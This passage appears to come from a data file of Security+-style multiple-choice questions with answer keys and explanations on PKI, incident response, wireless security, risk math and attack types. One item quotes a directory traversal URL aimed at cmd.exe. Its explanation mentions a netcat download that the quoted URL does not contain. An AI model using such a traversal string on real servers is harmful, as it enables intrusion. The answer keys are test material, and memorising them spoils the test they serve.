'correct':4,'explanation': 'Certificate Signing Request (CSR) is the message sent to a certificate authority (CA) from a registration authority (RA) to trigger the issuance of a digital certificate. SHA-1 is a hashing algorithm that is no longer supported for use in X.509 v3 certificates. Online Certificate Status Protocol (OCSP) is a means to query a CA to determine whether a certificate is valid or revoked. Public Key Infrastructure (PKI) is the combination of symmetric, asymmetric, hashing, and certificates into real-world products and solutions to support security business functions, of which CSR, CAs, and RAs are elements of its implementation.',},
{ 'question': '  Which of the following is a false statement in regard to an on-path attack? ','answers': ['It’s a form of eavesdropping attack.','It allows the attacker to intercept encrypted communications.','It only occurs over wireless connections.','It requires the attacker to impersonate the server to the client.',],
'correct':3,'explanation': 'On-path attacks are not limited to take place over wireless connections; they can be waged over any type of network. On-path attacks are a form of eavesdropping attack; they allow the attacker to intercept encrypted communications, and they require that the attacker impersonate the server to the client.',},
{ 'question': '  The IRT gathers in a conference room and works through a plan to resolve a potential business process interruption. The group uses small models of equipment, building blueprints, and printed copies of the IRP. What was the team doing? ','answers': ['Tabletop exercise','Full interruption test','Lessons learned','Reviewing retention policies',],
'correct':1,'explanation': 'The IRT in this scenario is performing a tabletop exercise. A full interruption test occurs when a primary site is turned off and business processes are moved to a secondary processing facility. Lessons learned is the final step in incident response, which is used to evaluate the response plan and procedures and improve them as necessary. Reviewing retention policies focuses on determining what vital information, such as activity logs and incident reports, is to be kept and for how long.',},
{ 'question': '  A new WAP is being installed to add wireless connectivity to the company network. The configuration policy indicates that WPA3 is to be used, and thus only newer or updated endpoint devices can connect. The policy also states that ENT authentication will not be implemented. What authentication mechanism can be implemented in this situation? ','answers': ['IEEE 802.1x','IEEE 802.1q','Simultaneous Authentication of Equals (SAE)','EAP-FAST',],
'correct':3,'explanation': 'WPA3 supports ENT and SAE authentication. Simultaneous Authentication of Equals (SAE) still uses a password, but it no longer encrypts and sends that password across the connection to perform authentication. Instead, SAE performs a zero-knowledge proof process known as Dragonfly Key Exchange, which is itself a derivative of Diffie-Hellman. IEEE 802.1x defines port-based network access control that ensures that clients can’t communicate with a resource until proper authentication has taken place. It’s based on Extensible Authentication Protocol (EAP) from PPP. However, this is the technology behind the label of ENT; thus, it is not an option in this scenario. IEEE 802.1q defines the use of VLAN tags and thus not relevant to WiFi authentication. Flexible Authentication via Secure Tunneling (EAP-FAST) is a Cisco protocol proposed to replace LEAP, which is now obsolete-thanks to the development of WPA2 and not supported in WPA3 either.',},
{ 'question': '  A company server is under direct remote attack from an Internet source. This attack is in fact a repeat occurrence that has already compromised three other systems. The CSO wants to prevent future connections from the source of the attack. How can this result be achieved? ','answers': ['Disable all ingress access to the systems in the screened subnet','Use a web proxy and disable caching services','Use a protocol analyzer to determine the source IP address and add it to the firewall’s blocklist.','Install an IDS and update the anti-malware scanner',],
'correct':3,'explanation': 'In this scenario, the source IP address of the attack needs to be discovered to prevent future connections. This can be accomplished using a protocol analyzer to determine the source IP address and then add that IP address to the firewall’s blocklist. The other options will not result in the desired outcome. Disabling ingress access to screened subnet systems will block all outsides from using the provided resources and services; this is too extreme of a response and not tailored specifically for the attacker. A web proxy without caching is not going to stop future attacks. An IDS and anti-malware scanner will not stop the attack, although an IDS might notice the attack and inform security personnel of the recurrence.',},
{ 'question': '  A new CISO is establishing an improved security management strategy within the organization. You’ve been asked to craft a draft of a new procedure to perform workstation hardening. When performing system hardening, what is the first step? ','answers': ['Install patches and updates','Scan for malicious code','Configure security software','Remove unnecessary elements',],
'correct':4,'explanation': 'Removing unnecessary elements is always the first step when performing system hardening. All of the other options are steps performed later in the process.',},
{ 'question': '  You are crafting an IRP for your organization. Which of the following is the proper order of operations for this? ','answers': ['Containment, eradication, identification, lessons learned, preparation, recovery','Preparation, identification, eradication, containment, lessons learned, recovery','Preparation, identification, containment, eradication, recovery, lessons learned','Preparation, containment, identification, recovery, eradication, lessons learned',],
'correct':3,'explanation': 'The correct order of the incident response plan (IRP) steps or phases is preparation, identification, containment, eradication, recovery, lessons learned. The other options are incorrect orders.',},
{ 'question': '  A vulnerability scan was performed on several company servers: Server109 – An internal DBMS Server115 – a public web server Server129 – the company SAN host Server134 – a jump box used to manage screened subnet servers, which is only accessible from the admin’s workstation The report from the vulnerability scanner included the following items, each of which has been verified as a true positive: Server109 is vulnerable to a privilege escalation exploit that would grant the attacker administrative privileges. Server115 is vulnerable to a directory traversal exploit that would allow for arbitrary code execution. Server129 is accessible from client systems. Server134 does not support TLS  An external threat group has been detected probing the company for weaknesses using port scans and social engineering techniques. Which of these systems should be placed on the top of the priority list to address first? ','answers': ['Server109','Server115','Server129','Server134',],
'correct':2,'explanation': 'The top priority concern from this collection of servers with these identified vulnerabilities is that of Server115. Since it is a publicly accessing web server with a known weakness leading to arbitrary code execution, it is the easiest target for the external attack group to compromise. Server109’s vulnerability is a high security concern in general, but since it is an internal system and the threat group is external, this is of less priority that Server115. Server129’s issue of being accessible from clients is only of modest concern, but generally SAN should be accessible primarily by servers. Clients should access the data hosted on a SAN via a server’s applications rather than directly to the SAN. Server134’s vulnerability of not supporting TLS 1.3 is of low concern as it likely supports TLS 1.2, which is still considered reliably secure, and it is only accessible from the admin’s workstation, which reduces its attack service considerably.',},
{ 'question': '  To provide a level of fault tolerance in encryption and certificate systems, which of the following can be used to recover keys in the event of a key or certificate corruption? ','answers': ['Escrow','Honeypot','IDS','VLAN',],
'correct':1,'explanation': 'Escrow provides fault tolerance for encryption and certificate systems to recover keys in the event of a key or certificate corruption. Honeypots, intrusion detection systems (IDSs), and virtual local area networks (VLANs) aren’t associated with certificates or cryptography.',},
{ 'question': '  Your organization has once again reduced the budget for the IT department. This means that the needed replacements of client and server systems will still not occur this year. Many systems are five to eight years old with a few even older than that. While the business tasks are still being accomplished the ability to add functions or expand productivity is limited. What is the primary risk of EOL and EOSL systems? ','answers': ['Are limited to cloud access','Can be cloned into VMs','No longer receiving security updates','Limit production activities and business tasks',],
'correct':3,'explanation': 'Legacy systems, such as end of life (EoL) and end of service life (EOSL) systems, have the primary risk that they no longer receive security updates from their original vendors. Thus, business using legacy systems are at an increased risk of compromise. EOL/EOSL systems are usually older products that don’t have cloud access built in, but even if they are cloud capable, it is highly unlikely that legacy systems are limited to cloud use. The biggest issue is not whether EOL/EOSL systems can or cannot access the cloud, the Internet, or even the local network, it is they have vulnerabilities that will never be fixed. Some EOL/EOSL systems can be cloned into a VM so they can be isolated more effectively while remaining available for production use. This is not a risk as it is a feature that could support reducing risk. EOL/EOSL systems are often retained because they support a necessary and essential business function, so without them the business may not be able to perform certain business processes.',},
{ 'question': '  The company CSO is reviewing the logs of their external web server when he discovers something he doesn’t recognize: http://thecompany.wiley/scripts/..% c0 % af../..% c0 % af../..% c0 % af../..% c0 %af../..% c0 % af../..% c0 % af../windows/system32/cmd.exe? What was being attempted by the attacker when they used this URL against the company’s web server? ','answers': ['Buffer overflow','Race conditions','Directory traversal','Memory leak',],
'correct':3,'explanation': 'This URL is attempting a directory traversal attack against the targeted website. The /..% c0 % af elements are attempts to change to a parent directory. If successful, this URL would reach the root of the web server’s storage device, then change into the Windows/System32/ folder, then execute the command prompt, and within that inject a command to download the nc (netcat) tool via TFTP command. This is not a buffer overflow as no attempt to overload memory is being attempted. This URL is well within the character limit of a URL, which varies between browsers, but is usually 2,048 characters or more. This is not a race conditions exploit as there is no attempt to alter the speed of execution or the order of execution of two processes. This is not a memory leak as there is no indication of an application constantly consuming memory and not releasing it.',},
{ 'question': '  Which of the following types of reports focuses on security controls and whether those controls are operating effectively? ','answers': ['SOC 1 Type 2','SOC 2 Type 1','SOC 2 Type 2','SOC 3 Type 1',],
'correct':3,'explanation': 'A SOC 2 report focuses on security controls, specifically “Report on Controls at a Service Organization Relevant to Security, Availability, Processing Integrity, Confidentiality or Privacy.” A Type 2 report (a sub-type of SOC) assesses the effectiveness of implemented controls. SOC 1 focuses on financial issues. SOC 3 is a report designed for general distribution, which means they do not contain confidential or private information, and are a derivative from SOC 2. Type 1 reports (a subtype of SOC) only focus on the description of a function or control; thus, they focus on documentation rather than implementation.',},
{ 'question': '  The CSO thinks that a system has been compromised. However, the CSO finds no evidence of the compromise in the system’s log files. After a conference with other members of the security team, the CSO believes the attack may have tampered with the log files and scrubbed away evidence of the intrusion. Which of the following would assist with retaining intrusion evidence if this attack were to re-occur? ','answers': ['Implement remote syslog','Use a more verbose logging setting','Reset permissions on the user’s home folders','Set command history to read-only',],
'correct':1,'explanation': 'The best option to retain evidence is to implement remote syslog. In this scenario, if remote syslog was operating, a cloned copy of the log files would be maintained on another system even if the compromised system’s logs were erased. Increasing log verbosity will not retain evidence if an intruder can erase the log. Resetting permissions on any folder will not preserve log evidence if its only copy is on the system compromised by the intruder. Setting command history to read-only will not be useful as it will prevent new activity from being added to the history, so future attacks using a command line will not be recorded.',},
{ 'question': '  What means of implementing security focuses on returning systems to normal after an unwanted or unauthorized activity has occurred? ','answers': ['Deterrent','Corrective','Preventive','Detective',],
'correct':2,'explanation': 'A corrective control modifies the environment to return systems to normal after an unwanted or unauthorized activity has occurred. It attempts to correct any problems that occurred as a result of a security incident. The other options are incorrect. A deterrent access control is deployed to discourage violation of security policies. Deterrent and preventive controls are similar, but deterrent controls often depend on individuals deciding not to take an unwanted action. A preventive control is deployed to thwart or stop un-wanted or unauthorized activity from occurring. The goal of a preventive control is to make a violating event or occurrence not take place or not be possible to occur. A detective control is deployed to discover or detect unwanted or unauthorized activity.',},
{ 'question': '  Which of the following is not MFA? ','answers': ['Voice and smart card','Password and PIN','Retina and voice','Location and OTP',],
'correct':2,'explanation': 'A password and a PIN are both something you know factors and thus are not considered a valid form of multi-factor authentication (MFA). MFA typically requires two or more different types of factors or attributes to be used to authenticate. While both retina and voice are biometrics, most biometrics are different enough from each other that they can be considered unique for MFA.',},
{ 'question': '  A new web application was installed onto the company’s public web server last week. Over the weekend a hacker was able to exploit the new code and gained access to data files hosted on the system. This is an example of what issue? ','answers': ['Inherent risk','Risk matrix','Qualitative assessment','Residual risk',],
'correct':1,'explanation': 'This situation is describing inherent risk. Inherent risk is the level of natural, native, or default risk that exists in an environment, system, or product prior to any risk management efforts being performed. The new application had vulnerabilities that were not mitigated, thus enabling the opportunity for the attack. This is not a risk matrix. A risk matrix or risk heat map is a form of risk assessment that is performed on a basic graph or chart, such as a 3 × 3 grid comparing probability and damage potential. This is not a qualitative risk assessment, as this scenario does not describe any evaluation of the risk of the new code. This is not residual risk as no controls were implemented to reduce risk and thus have leftover or residual risk from.',},
{ 'question': '  A security researcher was hired by an organization to stress test their security infrastructure. During the test, the researcher performs an active evaluation of a specific target. This evaluation included sending out requests to elicit a reply from wireless access points. The testing tool them probed the network to determine the SSID, the MAC address of the base station, the WiFi frequency and channel, and determined whether and what type of WiFi encryption was in use. What type of reconnaissance was being performed? ','answers': ['Footprinting','Sniffing','War driving','Pivoting',],
'correct':3,'explanation': 'This scenario describes the operation of the active reconnaissance technique known as war driving. War driving is the act of using a detection tool to look for wireless networking signals. Often, war driving refers to someone looking for wireless networks they aren’t authorized to access. Footprinting is gathering information about a target using OSINT techniques and therefore considered passive, while fingerprinting is interacting with the target to collect information and therefore considered active. Fingerprinting might include war driving activities, but not footprinting. Sniffing is the collection of network communications, which can be wired or wireless. War driving includes sniffing activities, but is much more than that. Sniffing a wireless network is considered a passive technique, while sniffing a wired network that uses switches is typically an active technique since it requires initiating an on-path attack to redirect packets for interception. Pivoting is when an initial system is compromised, then from that system with access to new information or perception of other networking elements, a new target is selected and additional attacks are launched from or through the initial compromised system. Pivoting is an active technique, but it is not what is described in this scenario.',},
{ 'question': '  During an incident investigation, several systems are determined to have been affected by the breach that occurred overnight. Three systems were classical systems, so their hard drives were removed for direct evidence acquisition. Two systems are the guest OSs on two different hosts. What is the best dataset to obtain to ensure sufficient evidence acquisition for these two systems while still being efficient? ','answers': ['Images','Firmware','Snapshot','Network traffic',],
'correct':3,'explanation': 'A snapshot is a backup feature of virtualization. It can clone a live OS in moments. A snapshot file can then be acquired as evidence and used to relaunch the OS on a forensic workstation. This approach will capture everything from the VM where the guest OS resides and be the most time, effort, and space efficient option. Drive images would be complete, but they would also capture the host OS, host data, and all other VMs present on the same hardware platform. And drive images of two systems would need to be obtained. This is not time, effort, or space efficient. Firmware in not relevant here; it is the wrong data set to be collecting. Network traffic is not necessarily useful in this situation, especially since the breach is already over (i.e., it occurred last night), and there was no mention of network data collected from the three classical systems.',},
{ 'question': '  During an account review, an auditor provided the following report: User: Last Login Length Last Password Change Bob 4 hours 87 days Sue 3 hours 38 days John 1 hour 935 days Kesha 3 hours 49 days The security manager reviews the account policies of the organization and takes note of the following requirements: Passwords must be at least 12 characters long. Passwords must include at least 1 example of 3 different character types. Passwords must be changed every 180 days. Passwords cannot be reused. Which of the following security controls should be corrected to enforce the password policy? ','answers': ['Minimum password length','Account lockout','Password history and minimum age','Password maximum age',],
'correct':4,'explanation': 'The issue revealed by the audit report is that one account has a password that is older than the requirements allow for; thus, correcting the password maximum age security setting should resolve this. There is no information in regard to password length, lockout, or password reuse in the audit report, so these options are not of concern in this situation.',},
{ 'question': '  Which of the following is not a step in the cyber kill chain? ','answers': ['Weaponization','Exploitation','Recovery','Installation',],
'correct':3,'explanation': 'Recovery is an IRP phase and thus not part of the cyber kill chain. The cyber kill chain phases are: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, and Actions on Objectives.',},
{ 'question': '  You attempt to visit Amazon.com but mistakenly type amazin.com. The website you see is an obvious rip-off of the valid online merchant. What is this situation called? ','answers': ['Watering hole attack','Typosquatting','Rainbow tables','Spear phishing',],
'correct':2,'explanation': 'Typosquatting, or URL hijacking, is a practice employed to capture traffic when a user mistypes the domain name or IP address of an intended resource. A squatter will predict URL typos and then register those domain names to direct traffic to their own site. The other options are incorrect. This situation is not describing a watering hole attack, the use of rainbow tables, or spear phishing.',},
{ 'question': '  A facility security manager has determined it is too easy for unauthorized personnel to gain access into the areas where sensitive data and equipment are stored. Which security control should be implemented to mitigate this concern? ','answers': ['Fences','Access control vestibules','Signage','Faraday cage',],
'correct':2,'explanation': 'The best facility physical security control for this scenario from these options is the access control vestibules. An access control vestibule will deter many but will thwart most unauthorized personnel from being able to gain access into the sensitive and now secured areas. Fences might reduce external entities from reaching a building in the first place, but fences are of no use once someone is inside a building. Signage does not prevent violations; it mostly provides direction and maybe some deterrence. A Faraday cage is not appropriate for this scenario; instead, it would be used to control electromagnetic emanations.',},
{ 'question': '  A large city’s central utility company has seen a dramatic increase in the number of distribution node failing or going offline. An APT group was attempting to take over control of the utility company and was responsible for the system failures. Which of the following systems has the attacker compromised? ','answers': ['MFP','RTOS','SoC','SCADA',],
'correct':4,'explanation': 'A large utility company is likely to be using supervisory control and data acquisition (SCADA) to manage and operate their equipment; therefore, that is the system that the APT group would have compromised. A multifunction printer (MFP) is unlikely the attack point that granted the APT group access to the utility distribution nodes. A real-time OS (RTOS) may have been present on some of the utility company’s systems, but that is not the obvious target for an attack to take over control of an entire utility service. There may be system on chip (SoC) equipment present at the utility, but those would still be controlled and accessed through the SCADA system at a utility company.',},
{ 'question': '  A third-party ethical hacking team was hired to stress test company servers in the DMZ. One of the attack attempts was able to inject executable code that resulted in a remote terminal session with root-level access. What type of attack took place? ','answers': ['XSRF','Privilege escalation','Logic bomb','Rootkit',],
'correct':2,'explanation': 'This attack is an example of an attack that used a privilege escalation exploit to gain root privileges for the remote terminal session. While many exploits or attacks could have achieved the remote terminal session, none of those options were mentioned. So, your attention needs to expand to consider all elements of the attack, not just the initial breach or weakness. This is not an example of XSRF, as that would have involved planting malware on a client system to send forged commands to a target server. This is not an example of a logic bomb, which is malware planted on a system to remain dormant and silent until a triggering event occurs. This is not necessarily a rootkit attack, although a planted rootkit could provide root level remote access. This attack could also have been performed using XSS, SQL injection, or even a buffer overflow, but the specific exploit was not mentioned.',},
{ 'question': '  To prevent any one administrator from taking full control over a cryptography system or performing fraud, which of the following solutions should not be implemented? ','answers': ['M of N control','Multiple key pairs','Separation of duties','Job rotation',],
'correct':4,'explanation': 'Job rotation isn’t appropriate in this situation since it trains each person in a rotation group to perform all administrative tasks and therefore provides each person with the ability to overrun the entire system. M of N controls, multiple key pairs, and separation of duties should be used to prevent a single person from compromising the entire system.',},
{ 'question': '  A rash of account takeovers have occurred against a number of employee accounts. To reduce the rate of occurrence of this type of attack, the company has increased password length requirements and is now enforcing password complexity. Additionally, they company has implemented a security mechanism which detects fraud through use and logon patterns, frequency, and consistency. Which of the following is a name for this security mechanism? ','answers': ['Password reuse','Time-based logins','Network location tracking','IdP',],
'correct':2,'explanation': 'The name for this security mechanism is time-based logins. Time-based logins are related to time of day restrictions, but the emphasis is on verifying identity and detecting fraud through use and logon patterns, frequency, and consistency. It is similar to keystroke logging, which while it is a biometric, it is more suited to intrusion detection than authentication. The remaining answers are incorrect. (A) Password reuse occurs when a user attempts to use a password they had used previously on the same system. The management of password history prevents password reuse. (C) Network location tracking can be an element in controlling access to systems and re-sources. It is a form of attribute-based access control (ABAC). (D) An identity provider (IdP) is a system that creates and manages identities and provides identification and authentication services.',},
{ 'question': '  ___________ may be left in an application by developers once a product is released to market. It was originally installed to allow for quick debugging. ','answers': ['A Trojan horse','A backdoor','An input validation check','A quality assurance test',],
'correct':2,'explanation': 'A backdoor may be left in an application by developers once a product is released to market. Backdoors are originally installed to allow for quick debugging. They are also called management hooks. A Trojan horse is a malicious program disguised as a legitimate program. Input validation checks are protections against buffer overflows; they should remain in an application. Quality assurance tests are improvements to the quality of developed software; they’re part of the development process but aren’t coded into the application.',},
{ 'question': '  Wireless clients connect to the network through a firewall after being properly authenticated by AAA services. The network uses both TACACS+ and RADIUS. What ports should be open to support the logon process? ','answers': ['TCP 389 and UDP 53','UDP 1812 and TCP 49','TCP 49 and UDP 162','UDP 19 and TCP 3389',],
'correct':2,'explanation': 'The ports from this list that are relevant are UDP 1812 for RADIUS and TCP 49 for TACACS+. TCP 389 is for plaintext LDAP, UDP 53 is for DNS queries, UDP 162 is for SNMP trap messages, UDP 19 is for CHARGEN (character generator protocol), and TCP 3389 is for RDP.',},
{ 'question': '  A new VoIP system is being deployed at a government contractor organization. They require high-availability of five 9s of up time for the voice communication system. They are also concerned about introducing new vulnerabilities into their existing data network structure. The IT infrastructure is based on fiber-optics and supports over 1 Gbps to each device, and the network often reaches near full saturation on a regular basis. What option should be considered that will provide the best outcome of performance, availability, and security for the VoIP service? ','answers': ['Create a new VLAN on the existing IT network for the VoIP service','Replace the current switches with routers and increase the interface speed to 1000 Mbps','Implement a new separate network for the VoIP system','Deploy flood guard protections on the IT network',],
'correct':3,'explanation': 'In this scenario, the only viable option to provide performance, availability, and security for the VoIP service is to implement a new separate network for the VoIP system that is independent of the existing data network. The current data network is already at capacity, so creating a new VLAN will not provide sufficient insurance that the VoIP service will be highly available. Replacing switches with routers is usually not a valid strategy for increasing network capacity, and 1000 Mbps is the same as 1 Gbps. Flood guards are useful against DoS and some transmission errors (such as Ethernet floods or broadcast storms), but they do not add more capacity to a network nor provide reliable up time for a VoIP service.',},
{ 'question': '  David wants to be able to manage the company web servers located in a screened subnet. The IT configuration currently prohibits an internal system from directly accessing systems in the screened subnet. Currently, he has to walk into the server vault to access the systems directly. He would rather have a secure connection to manage them remotely from his desk. What should David implement? ','answers': ['WAP with WEP','Telnet through the Internet','Jump server','VPN from the private network to the screened subnet',],
'correct':3,'explanation': 'The best option for David to remotely manage systems in a screened subnet is to deploy a jump server. A jump server or jumpbox is a remote access system deployed to make accessing a specific system or network easier or more secure. A jump server can be deployed to receive an in-band VPN connection, but most are configured to accept out-of-band connections, such as direct dial-up or Internet origin broadband links. A wireless access point (WAP) with wired equivalent privacy (WEP) is an insecure option as WEP encryption can be compromised easily. Telnet though the Internet is also an insecure option, and it would open the screened subnet to attacks from everywhere. A VPN would not work in this situation as there is already a prohibition from connecting between the private network and the screened subnet.',},
{ 'question': '  ___________ is an integrated circuit (IC) or chip that has all of the elements of a computer integrated into a single chip. ','answers': ['RTOS','ICS','SoC','SED',],
'correct':3,'explanation': 'System on a Chip (SoC) is an integrated circuit (IC) or chip that has all of the elements of a computer integrated into a single chip. This often includes the main CPU, memory, a GPU, WiFi, wired networking, peripheral interfaces (such as USB), and power management.',},
{ 'question': '  A worker received an email with an attachment. Upon opening the attachment their system was infected by malicious code. The malware encrypted all of the local and network data accessible by the worker. Obviously, the malware was not detected or blocked by the organization’s email filter, firewalls, IDS, or antivirus. Which of the following describes what took place? ','answers': ['The worker had excessive privileges.','The security controls all had a true positive event.','The email originated an internal email server with a verified source.','The malware was a zero-day attack.',],
'correct':4,'explanation': 'This scenario describes a situation where the malware was a zero-day attack. Thus, an unknown malware is easily able to bypass most security filters and detectors. This scenario does not indicate that the worker has excessive privileges, just that malware took full advantage of what privileges the worker had to encrypt local and network data accessible to the worker. This scenario did not result in security controls having a true positive, as that would have been a successful detection of the malware. The security controls experienced a false negative. The scenario did not indicate the source of the message, but zero-day malware would still have been able to infect the worker’s system if it did come from an internal source.',},
{ 'question': '  As a security manager, you are evaluating logging tools and utilities to optimize your ability to evaluate logs during investigations. Which of the following is true in regard to the NXLog tool? ','answers': ['This tool was used to perform round-trip time tests of network targets.','This command is used to view the contents of logs generated by systemd on *nix systems.','This tool can function similarly to syslog, but it not limited to syslog file formats. This tool can handle logs in nearly any format and perform rewrite, correlation, a','This tool is an IETF protocol used as a standard for exporting IP flow information.',],
'correct':3,'explanation': 'The NXLog tool is a log management tool available on most OSs. This tool can function similarly to syslog, but it not limited to syslog file formats. NXLog can handle logs in nearly any format and perform rewrite, correlation, alerting, and pattern matching. The other options are incorrect as they relate to other utilities. Echo was used to perform round-trip time tests of network targets. The command journalctl is used to view the contents of logs generated by systemd on *nix systems. Internet Protocol Flow Information Export (IPfix) is an IETF protocol used as a standard for exporting IP flow information.',},
{ 'question': '  The internal development team has performed an assessment of the reliability, stability, resilience, and security of their newly developed business application. The code personnel who wrote the code were on the team that performed the live security assessment. What type of evaluation method was used? ','answers': ['Lateral movement','Passive reconnaissance','Integration testing','Known environment testing',],
'correct':4,'explanation': 'This scenario describes a known environment test, since those performing the testing are fully knowledgeable about the software code and its operations and functions. This is not lateral movement, which is when an intruder is able to gain remote control over another internal system after pivoting from the initial system they compromised. This is not passive reconnaissance, which is to gather information about a target in such a way as to not be noticed by said target. This is not integration testing as it seems to have taken place in the development environment, as there was no mention of the new application already being placed into production. Integration testing is performed when a new product is deployed or integrated into a real or simulated production environment to ensure that all previously function work tasks still work and all newly added or expected work tasks work as well.',},
{ 'question': '  Cathy, a worker in the accounts payable department, receives an email with the subject line of “FW:INTERNAL:Urgent Unpaid Invoice – Final Notice” and it has a source email address of the CFO. She checks the company records for the service that the invoice claims need to be paid for, but finds no evidence of the company using the service. She calls the CFO and asks about the invoice, but the CFO does not know about the service nor did he forward the email to Cathy. What type of event has Cathy been the target of? ','answers': ['Tailgating','Prepending','Whaling','Influence campaign',],
'correct':2,'explanation': 'Cathy has been the target of a prepending-based email invoice scam. This event could also be labeled as pretexting and a business email compromise (BEC). This is not a tailgating event, as Cathy was not followed into a building by an unauthorized person. This is not a whaling attack as those usually focus on leaders of companies rather than regular employees. This is not an influence campaign as those usually take place on social networks and through social media to change ideas or opinions.',},
{ 'question': '  Which of the following options is the most secured version of wireless configuration? ','answers': ['OSA','WEP','WPA','CCMP',],
'correct':4,'explanation': 'Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is a variant of the Advanced Encryption Standard (AES) and the encryption scheme used in WPA2 (WiFi Protected Access 2). Open System Authentication (OSA) offers no security, Wired Equivalent Privacy (WEP) encryption is crackable in less than 60 seconds, and WPA encryption is crackable in hours.',},
{ 'question': '  A visitor to your company web server was shown an error when they clicked a link to access a resource that was improperly stored. The error message revealed the DBMS product used by your organization. That visitor then purchased an exploit from a dark web marketplace. The exploit targets a specific DBMS to extract credentials stored in customer tables. What type of attack is this? ','answers': ['Script kiddie','SQLi','On-path','Impersonation',],
'correct':1,'explanation': 'This scenario describes an attack that is based around a script kiddie. The specifics of the exploit are not revealed, so while SQLi may sound likely, there are many other exploits and attacks that could get the results of customer credentials. The key to this question is the activity of the attacker; they had to go buy an exploit rather than either knowing how to craft one themselves or knowing how to perform the attack on their own without an automating tool. That’s why it’s called a script kiddie attack. This scenario does not represent an on-path attack, as there is no mention of the attacker positioning themselves between a client and server. This scenario does not describe an impersonation attack. However, once customer credentials are obtained, then later attacks could be impersonation if the attacker logs on to a system using stolen credentials.',},
{ 'question': '  Which of the following describes a private cloud? ','answers': ['A cloud environment maintained, used, and paid for by a group of users or organizations for their shared benefit, such as collaboration and data exchange.','A cloud service within a corporate network and isolated from the Internet by a firewall, or it can be hosted by a third party over the Internet.','A cloud service that is accessible to the general public typically over an Internet connection often based on a multitenant configuration.','A cloud service that is partially hosted within an organization for private use and that uses external services to offer recourse to outsiders.',],
'correct':2,'explanation': 'A private cloud is a cloud service within a corporate network and isolated from the Internet by a firewall, or it can be hosted by a third party over the Internet. A community cloud is a cloud environment maintained, used, and paid for by a group of users or organizations for their shared benefit, such as collaboration and data exchange. A public could is a cloud service that is accessible to the general public typically over an Internet connection often based on a multitenant configuration. A hybrid cloud is a cloud service that is partially hosted within an organization for private use and that uses external services to offer resources to outsiders.',},
{ 'question': '  A CSP wants to offer a new high-security service to customers where their data is transferred, stored, and process while it remains encrypted. At no point would the customer data be in plaintext on the cloud system or anytime it was outside of a customer’s device or location. The CSP can use standard VPN and TLS encryption for communications as well as AES-256 to encrypt data in storage. What else needs to be implemented to fulfil the promises of this cloud solution? ','answers': ['Key stretching','Homomorphic encryption','Quantum supremacy','Lightweight cryptography',],
'correct':2,'explanation': 'To keep data encrypted while it is being processed the cloud provider needs to implement homomorphic encryption. Homomorphic encryption is a cryptographic system that enables data to remain in ciphertext form while data manipulation operations are performed against it. This allows for data to retain confidentiality protection while being actively processed (i.e., data in use/data in processing) by a specialized application. Key stretching is not the right technology for this scenario. Key stretching is a collection of techniques that can potentially take a weak key or password and stretch it to become more secure or convert a password into an encryption key. Quantum supremacy is not the correct concept for this cloud solution. Quantum supremacy is the achievement of creating a quantum computer that can solve a problem that classical computers cannot.',},
{ 'question': '  There is a risk that an avalanche may damage your 3 million manufacturing facility. Experts claim that there is a 5 percent chance that an avalanche will occur each year. They further advise you that an avalanche would completely destroy your building. Your business insurance will cover the loss, but such coverage would require you to rebuild on the same land. The building and its contents account for 90 percent of the value of the facility; the remainder is attributed to the land itself. What is the single-loss expectancy of your shipping facility to avalanches? ','answers': ['3,000,000','2,700,000','270,000','135,000',],
'correct':2,'explanation': 'The single-loss expectancy (SLE) is calculated by multiplying the AV (3,000,000) by the EF (90%). Thus, SLE = 2,700,000. The EF is only the portion of the value lost due to the risk of avalanche, which is indicated as 90%. The 10% of the remaining value is assigned to the land, which is required as the location for rebuilding (i.e., its value is not lost in this scenario). 3,000,000 is the overall value of the facility, contents, and land combined. 135,000 is the annualized loss expectancy (ALE), which is calculated by multiplying the SLE by the annualized rate of occurrence (ARO) of 5% per year. The 270,000 is not a valid result of any standard quantitative risk analyses calculation based on the parameters of this scenario.',},
{ 'question': '  Which of the following is a technology that is the equivalent of RFID? ','answers': ['Field-powered proximity device','Passive proximity device','Self-powered proximity device','TOTP token',],
'correct':1,'explanation': 'Radio frequency identification (RFID) is effectively a field-powered proximity device. A passive proximity device is often a magnet, an RFID does not use a magnet, but an antenna to generate current from a magnet field provided by an external source. A self-powered proximity device has its own battery, which RFID does not, but NFC may. A TOTP token is a device with an LCD screen that displays a one-time use password that is based on time and that changes at fixed time intervals.',},
{ 'question': '  A review of your company’s virtualization of operations determines that the hardware resources supporting the VMs is nearly fully consumed. The auditor asks for the plan and layout of VM systems, but is told that no such plan exists. This reveals that the company is suffering from what issue? ','answers': ['Use of EOSL systems','VM sprawl','Poor cryptography','VM escaping',],
'correct':2,'explanation': 'The issue in this situation is VM sprawl. Sprawl occurs when organizations fail to plan out their IT/IS needs and just deploy new systems, software, and VMs whenever their production needs demand it. This often results in obtaining underpowered equipment that is then overtaxed by inefficient implementations of software and VMs. This situation is not specifically related to end of service life (EoSL) systems, but EoSL systems would exacerbate the sprawl issue. This situation is not related to poor cryptography, nor is there any evidence of VM escaping issues.',},
{ 'question': '  What type of security mechanism is both a prevention and a corrective control? ','answers': ['VPN','WiFi','Anti-malware','FDE',],
'correct':3,'explanation': 'Anti-malware is both a prevention and a corrective control. A VPN and FDE are primarily prevention controls. WiFi is not a security control; it is a network communications technology.',},
{ 'question': '  What form of recovery site requires the least amount of downtime before mission-critical business operations can resume? ','answers': ['Cold','Warm','Hot','Offsite',],
'correct':3,'explanation': 'A hot site requires the least amount of downtime before mission-critical business operations can resume, because it is a real-time mirror of the primary site. A cold site would require the most amount of downtime to improve the location to the point it could support mission-critical processes. A warm site would require moderate downtime to be improved to use. All recovery sites are offsite locations, so this selection isn’t a valid answer.',},
{ 'question': '  A company is rolling out a new PKI-based authentication and communications system. Workers are currently using a ruggedized tablet to perform their work functions. These tablets include WiFi support, memory cards, USB OTG devices, and a RFID/NFC reader. However, the current software on the tablet does not include PKI support natively. Which of the following is the BEST solution for ensuring workers can get their job done securely? ','answers': ['MicroSD HSM','FDE','Containerization','Screen locks',],
